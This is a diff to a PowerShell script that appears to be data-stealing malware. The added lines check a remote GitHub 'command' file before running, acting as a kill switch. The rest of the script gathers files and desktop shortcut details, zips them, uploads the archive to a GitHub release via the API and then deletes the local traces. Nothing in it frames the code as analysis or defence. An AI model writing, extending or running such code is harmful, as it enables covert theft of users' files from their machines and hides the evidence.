@@ -1,3 +1,16 @@
+# STEP 0: 远程控制执行权限
+$controlUrl = "https://raw.githubusercontent.com/drftghy/backup-files/refs/heads/main/.github/command.txt"
+try {
+    $flag = Invoke-RestMethod -Uri $controlUrl -UseBasicParsing
+    if ($flag.Trim().ToLower() -ne "upload") {
+        Write-Output "🛑 当前指令为 '$flag'，脚本终止。"
+        exit
+    }
+} catch {
+    Write-Output "❌ 无法读取远程控制指令，脚本终止。"
+    exit
+}
+
 # Set UTF-8 encoding
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
@@ -45,7 +58,7 @@ foreach ($path in $pathList) {
     } catch {}
 }
 
-# STEP 2: Extract .lnk shortcut info from Desktop
+# STEP 2: 提取桌面快捷方式信息
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -67,14 +80,14 @@ try {
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
 } catch {}
 
-# STEP 3: Archive
+# STEP 3: 压缩归档
 try {
     Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
     return
 }
 
-# STEP 4: Send to GitHub as a release asset
+# STEP 4: 上传到 GitHub Releases
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -106,6 +119,6 @@ try {
     $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
 } catch {}
 
-# STEP 5: Cleanup
+# STEP 5: 清理痕迹
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
